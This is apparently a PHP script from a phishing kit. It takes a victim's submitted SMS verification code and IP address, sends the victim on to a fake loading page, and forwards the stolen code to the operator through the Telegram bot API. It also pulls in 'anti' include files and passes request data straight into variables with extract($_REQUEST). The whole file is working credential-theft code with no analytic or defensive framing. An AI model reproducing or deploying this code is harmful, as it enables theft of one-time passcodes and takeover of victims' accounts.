<?php 
include "../../anti/genius.php";
include "../../anti/genius1.php"; 
include "../../anti/genius2.php"; 
include "../../anti/genius3.php"; 
include "../../anti/genius4.php"; 
include "../../anti/genius5.php"; 
include "../../anti/genius6.php"; 
include "../../anti/genius7.php";
include "../../anti/genius8.php";
extract($_REQUEST);
include "../id.php";
$ipp=$_SERVER['REMOTE_ADDR'];
$sms=$_POST["sms"];

$message="----------SMS----------"."\n"."SMS Code 2 :  ".$sms."\n"."IP: ".$ipp."\n"."----------|SMS|----------";
$user_ids=$id;

header("location: loading1.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);

}
?>